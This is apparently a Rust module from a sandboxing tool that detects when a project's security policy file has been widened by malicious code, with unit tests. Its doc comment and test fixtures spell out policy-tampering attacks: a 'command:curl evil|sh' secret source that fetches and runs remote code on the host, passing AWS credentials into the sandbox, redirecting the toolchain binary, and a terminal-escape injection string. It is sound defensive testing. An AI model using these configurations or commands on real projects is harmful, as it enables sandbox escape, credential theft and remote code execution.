//! Detecting a policy that was widened behind your back.
//!
//! # The problem this exists to solve
//!
//! `senv.toml` lives in the project directory, and the run phase grants the
//! project **read-write** — that is the point of the run phase. So the policy
//! file is writable by exactly the code the policy is meant to contain. A
//! package that executes once under `senv run` can rewrite `senv.toml` and own
//! every later invocation.
//!
//! That was not theoretical. Before this module existed, one execution was
//! enough to:
//!
//! - set `[run] net = "host"` and exfiltrate freely from then on;
//! - add `[run.env] pass = ["AWS_SECRET_ACCESS_KEY"]` and be handed the
//!   credential to exfiltrate;
//! - set `[secrets.X] source = "command:…"`, which the secrets broker runs
//!   **on the host, outside the sandbox** — a full escape;
//! - set `[env] uv = "./evil"`, pointing senv's own toolchain at a binary the
//!   attacker had just written into the project.
//!
//! Moving the file out of the project would not fix it: a policy you cannot
//! edit next to the code it governs is a policy nobody will keep in version
//! control, and the same argument applies to any path the sandbox can reach.
//!
//! # The fix
//!
//! senv keeps a normalized snapshot of the security-relevant settings in
//! `state.json`, which lives outside every grant senv issues. Before compiling
//! a policy it compares the config on disk against that snapshot:
//!
//! - unchanged, or **narrowed** → proceed, and record the new snapshot;
//! - **widened** → refuse, name every widening, and require `senv trust`.
//!
//! Narrowing needs no ceremony because an attacker gains nothing by it. Only
//! widening is interesting, and widening is exactly what a person editing
//! their own policy is doing deliberately — so the confirmation lands on the
//! action that deserves it, and ordinary edits like removing a host stay
//! silent.
//!
//! This is tamper-evidence, not prevention: senv cannot stop a package from
//! writing the file, only refuse to act on the result until a human agrees.
//! That is the strongest honest guarantee available when the policy has to
//! live next to the code.

use serde::{Deserialize, Serialize};

use crate::config::{CacheScope, Config, InstallNet};

/// The security-relevant shape of a configuration, normalized for comparison.
///
/// Deliberately not the whole `Config`: comparing raw file bytes would flag a
/// reformatted comment as a security event, and people stop reading warnings
/// that fire on nothing.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct PolicySnapshot {
    pub run_net: NetLevel,
    pub run_hosts: Vec<String>,
    pub run_read: Vec<String>,
    pub run_write: Vec<String>,
    pub run_env_pass: Vec<String>,
    pub install_net: NetLevel,
    pub install_indexes: Vec<String>,
    pub install_read: Vec<String>,
    pub install_project_writable: bool,
    pub install_cache_shared: bool,
    pub isolation: Option<String>,
    pub image: Option<String>,
    pub uv: Option<String>,
    pub allow_command_secrets: bool,
    /// `NAME=source`, so a source changing under a stable name is visible.
    pub secrets: Vec<String>,
}

/// How much network a phase may reach, ordered so "more" is comparable.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum NetLevel {
    #[default]
    Deny,
    Allowlist,
    Host,
}

impl NetLevel {
    fn as_str(self) -> &'static str {
        match self {
            NetLevel::Deny => "deny",
            NetLevel::Allowlist => "an allowlist",
            NetLevel::Host => "unrestricted",
        }
    }
}

impl PolicySnapshot {
    /// Reduce a configuration to what a reviewer would care about.
    pub fn of(config: &Config) -> PolicySnapshot {
        let run_net = if config.run.net.is_host() {
            NetLevel::Host
        } else if config.run.net.hosts().is_empty() {
            NetLevel::Deny
        } else {
            NetLevel::Allowlist
        };
        let mut snapshot = PolicySnapshot {
            run_net,
            run_hosts: config.run.net.hosts().to_vec(),
            run_read: config.run.fs.read.clone(),
            run_write: config.run.fs.write.clone(),
            run_env_pass: config.run.env.pass.clone(),
            install_net: match config.install.net {
                InstallNet::Registries => NetLevel::Allowlist,
                InstallNet::Host => NetLevel::Host,
            },
            install_indexes: config.install.extra_indexes.clone(),
            install_read: config.install.read.clone(),
            install_project_writable: config.install.project_writable,
            install_cache_shared: config.install.cache == CacheScope::Shared,
            isolation: config.env.isolation.clone(),
            image: config.env.image.clone(),
            uv: config.env.uv.clone(),
            allow_command_secrets: config.env.allow_command_secrets,
            secrets: config
                .secrets
                .iter()
                .map(|(name, s)| {
                    format!(
                        "{name}={}",
                        s.source
                            .clone()
                            .unwrap_or_else(|| format!("env:SENV_SECRET_{name}"))
                    )
                })
                .collect(),
        };
        for list in [
            &mut snapshot.run_hosts,
            &mut snapshot.run_read,
            &mut snapshot.run_write,
            &mut snapshot.run_env_pass,
            &mut snapshot.install_indexes,
            &mut snapshot.install_read,
            &mut snapshot.secrets,
        ] {
            list.sort();
            list.dedup();
        }
        snapshot
    }

    /// Every way `self` grants more than `previous`, in words a user can act
    /// on. Empty means the change is safe to accept silently.
    pub fn widenings(&self, previous: &PolicySnapshot) -> Vec<String> {
        let mut found = Vec::new();

        if self.run_net > previous.run_net {
            found.push(format!(
                "[run] net: {} → {}",
                previous.run_net.as_str(),
                self.run_net.as_str()
            ));
        }
        if self.install_net > previous.install_net {
            found.push(format!(
                "[install] net: {} → {}",
                previous.install_net.as_str(),
                self.install_net.as_str()
            ));
        }

        added(
            &mut found,
            "[run] net",
            &self.run_hosts,
            &previous.run_hosts,
        );
        added(
            &mut found,
            "[run.fs] read",
            &self.run_read,
            &previous.run_read,
        );
        added(
            &mut found,
            "[run.fs] write",
            &self.run_write,
            &previous.run_write,
        );
        added(
            &mut found,
            "[run.env] pass",
            &self.run_env_pass,
            &previous.run_env_pass,
        );
        added(
            &mut found,
            "[install] extra-indexes",
            &self.install_indexes,
            &previous.install_indexes,
        );
        added(
            &mut found,
            "[install] read",
            &self.install_read,
            &previous.install_read,
        );
        added(&mut found, "[secrets]", &self.secrets, &previous.secrets);

        if self.install_project_writable && !previous.install_project_writable {
            found.push(
                "[install] project-writable: false → true (build backends may edit your source)"
                    .to_string(),
            );
        }
        if self.install_cache_shared && !previous.install_cache_shared {
            found.push(
                "[install] cache: project → shared (an install here can affect other projects)"
                    .to_string(),
            );
        }
        if self.allow_command_secrets && !previous.allow_command_secrets {
            found.push(
                "[env] allow-command-secrets: false → true (secret sources may run host code \
                 OUTSIDE the sandbox)"
                    .to_string(),
            );
        }

        // These three are conservative: any change at all is reported, because
        // each redirects what senv executes or how strongly it confines, and
        // there is no ordering in which a change is obviously safe.
        changed(
            &mut found,
            "[env] uv (the binary senv runs)",
            &self.uv,
            &previous.uv,
        );
        changed(
            &mut found,
            "[env] isolation",
            &self.isolation,
            &previous.isolation,
        );
        changed(&mut found, "[env] image", &self.image, &previous.image);

        found
    }
}

fn added(found: &mut Vec<String>, label: &str, new: &[String], old: &[String]) {
    let fresh: Vec<&String> = new.iter().filter(|v| !old.contains(v)).collect();
    if !fresh.is_empty() {
        let list: Vec<String> = fresh.iter().map(|v| crate::util::sanitize(v)).collect();
        found.push(format!("{label}: added {}", list.join(", ")));
    }
}

fn changed(found: &mut Vec<String>, label: &str, new: &Option<String>, old: &Option<String>) {
    if new != old {
        let show = |v: &Option<String>| {
            v.as_deref()
                .map(crate::util::sanitize)
                .unwrap_or_else(|| "unset".to_string())
        };
        found.push(format!("{label}: {} → {}", show(old), show(new)));
    }
}

/// What senv should do about the configuration it just loaded.
#[derive(Debug, Clone)]
pub enum Verdict {
    /// No record yet. The config is adopted as the baseline.
    ///
    /// This is the right default rather than a hole: reaching a first run means
    /// the user chose to work in this project, and a `senv.toml` that arrived
    /// with the repository is trusted exactly as much as the code beside it.
    /// The threat this module addresses is a *package* editing the policy after
    /// senv is already in use, and that always has a prior record to fail
    /// against.
    FirstSight,
    /// Unchanged, or narrowed.
    Trusted,
    /// Grants more than the recorded snapshot.
    Widened(Vec<String>),
}

impl Verdict {
    pub fn widenings(&self) -> &[String] {
        match self {
            Verdict::Widened(w) => w,
            _ => &[],
        }
    }

    pub fn is_widened(&self) -> bool {
        matches!(self, Verdict::Widened(_))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    fn config(text: &str) -> Config {
        let cfg: Config = toml::from_str(text).expect("valid config");
        cfg.validate(Path::new("senv.toml")).expect("valid config");
        cfg
    }

    fn verdict(before: &str, after: &str) -> Vec<String> {
        PolicySnapshot::of(&config(after)).widenings(&PolicySnapshot::of(&config(before)))
    }

    #[test]
    fn opening_the_network_is_a_widening() {
        let w = verdict("", "[run]\nnet = \"host\"\n");
        assert_eq!(w.len(), 1, "{w:?}");
        assert!(w[0].contains("unrestricted"), "{w:?}");

        let w = verdict("", "[run]\nnet = [\"api.example.com\"]\n");
        assert!(!w.is_empty(), "deny → allowlist is still more than deny");
    }

    #[test]
    fn adding_a_host_to_an_existing_allowlist_is_a_widening() {
        let w = verdict(
            "[run]\nnet = [\"a.example.com\"]\n",
            "[run]\nnet = [\"a.example.com\", \"b.example.com\"]\n",
        );
        assert_eq!(w.len(), 1, "{w:?}");
        assert!(w[0].contains("b.example.com"), "{w:?}");
    }

    #[test]
    fn narrowing_needs_no_ceremony() {
        // Removing access must never prompt: an attacker gains nothing by it,
        // and a warning that fires on safe edits is a warning people learn to
        // click through.
        assert!(verdict("[run]\nnet = \"host\"\n", "").is_empty());
        assert!(
            verdict(
                "[run]\nnet = [\"a.example.com\", \"b.example.com\"]\n",
                "[run]\nnet = [\"a.example.com\"]\n",
            )
            .is_empty()
        );
        assert!(verdict("[run.fs]\nread = [\"/data\"]\n", "").is_empty());
        assert!(verdict("[install]\nproject-writable = true\n", "").is_empty());
    }

    #[test]
    fn an_unchanged_config_is_silent_even_when_it_is_wide() {
        let wide = "[run]\nnet = \"host\"\n[run.fs]\nread = [\"/etc\"]\n";
        assert!(verdict(wide, wide).is_empty());
    }

    #[test]
    fn every_escalation_from_the_proof_of_concepts_is_caught() {
        // Each of these was a working exploit before this module existed.
        let host_rce_via_secret =
            "[env]\nallow-command-secrets = true\n[secrets.X]\nsource = \"command:curl evil|sh\"\n";
        let w = verdict("", host_rce_via_secret);
        assert!(
            w.iter().any(|f| f.contains("allow-command-secrets")),
            "the host-code gate must be reported: {w:?}"
        );
        assert!(w.iter().any(|f| f.contains("[secrets]")), "{w:?}");

        let host_rce_via_uv = "[env]\nuv = \"/proj/evil.sh\"\n";
        let w = verdict("", host_rce_via_uv);
        assert!(w.iter().any(|f| f.contains("[env] uv")), "{w:?}");

        let exfiltration = "[run]\nnet = \"host\"\n[run.env]\npass = [\"AWS_SECRET_ACCESS_KEY\"]\n";
        let w = verdict("", exfiltration);
        assert!(w.iter().any(|f| f.contains("net")), "{w:?}");
        assert!(
            w.iter().any(|f| f.contains("AWS_SECRET_ACCESS_KEY")),
            "{w:?}"
        );

        let weaken_tier = "[env]\nisolation = \"process\"\n";
        assert!(!verdict("[env]\nisolation = \"supervised\"\n", weaken_tier).is_empty());
    }

    #[test]
    fn a_secret_whose_source_changes_is_reported_even_under_the_same_name() {
        // Renaming the source is how an env: secret quietly becomes a
        // command: secret.
        let w = verdict(
            "[env]\nallow-command-secrets = true\n[secrets.TOKEN]\nsource = \"env:TOKEN\"\n",
            "[env]\nallow-command-secrets = true\n[secrets.TOKEN]\nsource = \"command:evil\"\n",
        );
        assert!(w.iter().any(|f| f.contains("command:evil")), "{w:?}");
    }

    #[test]
    fn reported_widenings_cannot_carry_terminal_escapes() {
        // The config is attacker-writable, and its contents are quoted back to
        // the user inside senv's own framing.
        // TOML's own escape for ESC is \u001b.
        let hostile = "[run.fs]\nread = [\"/data\\u001b[32mSAFE\"]\n";
        let cfg: Config = toml::from_str(hostile).expect("parses");
        assert!(
            cfg.run.fs.read[0].contains('\u{1b}'),
            "the fixture must actually be hostile"
        );
        let w = PolicySnapshot::of(&cfg).widenings(&PolicySnapshot::default());
        assert!(!w.iter().any(|f| f.contains('\u{1b}')), "{w:?}");
    }
}
